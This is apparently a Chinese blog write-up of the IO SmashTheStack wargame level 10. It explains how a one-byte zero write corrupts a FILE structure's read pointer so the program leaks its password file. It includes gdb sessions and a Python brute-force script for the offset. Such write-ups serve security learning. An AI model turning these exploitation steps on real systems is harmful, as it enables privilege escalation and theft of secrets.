---
title: IO SmathTheStack Level 10
author: kelwin
layout: post
permalink: /io-smaththestack-level-10/
categories:
  - wargame
  - writeup
---
IO SmathTheStack Level 10的程序代码如下：

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    
    int main(int argc, char **argv){
            FILE *fp = fopen("/levels/level10_alt.pass", "r");
            struct {char pass[20], msg_err[20]} pwfile = {{0}};
            char ptr[0];
    
            if(!fp || argc != 2)
                    return -1;
    
            fread(pwfile.pass, 1, 20, fp);
        pwfile.pass[19] = 0;
            ptr[atoi(argv[1])] = 0;
            fread(pwfile.msg_err, 1, 19, fp);
            fclose(fp);
    
            if(!strcmp(pwfile.pass, argv[1]))
                    execl("/bin/sh", "sh", 0);
            else
                    puts(pwfile.msg_err);
    
            return 0;
    }
    

阅读代码发现，输入的argv[1]被atoi函数转成整数，加到ptr这个栈上的指针上，然后在对应的字节上写入0，也就是说我们只能通过输入参数将进程内存空间中某一个字节置为0。

一开始我一直在想办法绕过strcmp函数，进入execl拿到shell，百思不得其解；后来突然关注到了后面的else语句，想到可以利用puts语句来输出pwfile.pass，而这个可以通过重定位FILE对象*fp里面的文件读写指针来实现，因为写入字节0再第二次fread操作之前。

于是自己在BT5上编译程序验证这个想法的可行性，带上-g参数带符号表进行gdb调试：

    gcc -g level10.c -o level10
    

在第一个fread处设上断点，然后查看*fp结构，注意到这个FILE对象是分配在堆上的：

    Breakpoint 1, 0x08048616 in main (argc=2, argv=0xbffff5d4) at level10.c:14
    14          fread(pwfile.pass, 1, 20, fp);
    (gdb) p *fp
    $1 = {_flags = -72539000, _IO_read_ptr = 0x0, _IO_read_end = 0x0, 
      _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, 
      _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, 
      _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, 
      _markers = 0x0, _chain = 0xb7fca580, _fileno = 5, _flags2 = 0, 
      _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "", 
      _lock = 0x804b0a0, _offset = -1, __pad1 = 0x0, __pad2 = 0x804b0ac, 
      __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0, _mode = 0, 
      _unused2 = '\000' <repeats 39 times>}
    

执行完第一次fread后再次查看*fp：

    (gdb) ni
    15      pwfile.pass[19] = 0;
    (gdb) p *fp
    $2 = {_flags = -72539000, 
      _IO_read_ptr = 0xb7fdf014, 
      _IO_read_base = 0xb7fdf000, 
      _IO_write_base = 0xb7fdf000, 
      _IO_write_ptr = 0xb7fdf000, 
      _IO_write_end = 0xb7fdf000, 
      _IO_buf_base = 0xb7fdf000, 
      _IO_buf_end = 0xb7fe0000 "d", _IO_save_base = 0x0, _IO_backup_base = 0x0, 
      _IO_save_end = 0x0, _markers = 0x0, _chain = 0xb7fca580, _fileno = 5, 
      _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\000', 
      _shortbuf = "", _lock = 0x804b0a0, _offset = -1, __pad1 = 0x0, 
      __pad2 = 0x804b0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0, _mode = -1, 
      _unused2 = '\000' <repeats 39 times>}
    

这里注意到&#95;IO&#95;read&#95;ptr已经有了数值，相比较&#95;IO&#95;read&#95;base有了0&#215;14字节的偏移，因为第一次读取了0&#215;14字节。我们只需要将&#95;IO&#95;read&#95;ptr的最低一个字节覆盖为0，这样下一次fread就又从头开始读了。查看fp->&#95;IO&#95;read&#95;ptr所在地址和ptr地址：

    (gdb) p &fp->_IO_read_ptr
    $3 = (char **) 0x804b00c
    (gdb) p ptr
    $4 = 0xbffff4e4
    

可以使用gdb的set命令验证想法的正确性，继续执行会发现输出的确实是文件最开始的字符串：

    (gdb) set fp->_IO_read_ptr=0xb7fdf000
    

现在如果我们要利用参数来覆盖&#95;IO&#95;read&#95;base的最低字节，只需要计算便宜&fp->&#95;IO&#95;read&#95;ptr-ptr即可，在BT5中计算到0x804b00c-0xbffff4e4=1208269608，但是在远程的主机上这个数值肯定不同，而且由于关闭了ASLR，这个数值是固定的，因此我们可以对其附近的范围进行穷举，在/tmp目录中新建一个目录，写入如下python脚本：

    #!/usr/bin/env python
    import subprocess
    import sys
    
    start = 1208270000
    end = 1208280000
    for i in range(start, end):
      try:
        output = subprocess.check_call(["/levels//level10", str(i)])
      except Exception:
        continue
    

很快就能穷举完，在一堆ACCESS DENIED&#8230;之中你会发现一个key，拿到这个key之后再作为参数传入level10中运行即可得到euid为level10的shell。值得注意的是key中有两个感叹号，shell中默认代表上一条指令，因此需要加反斜杠&#8217;\'进行转义。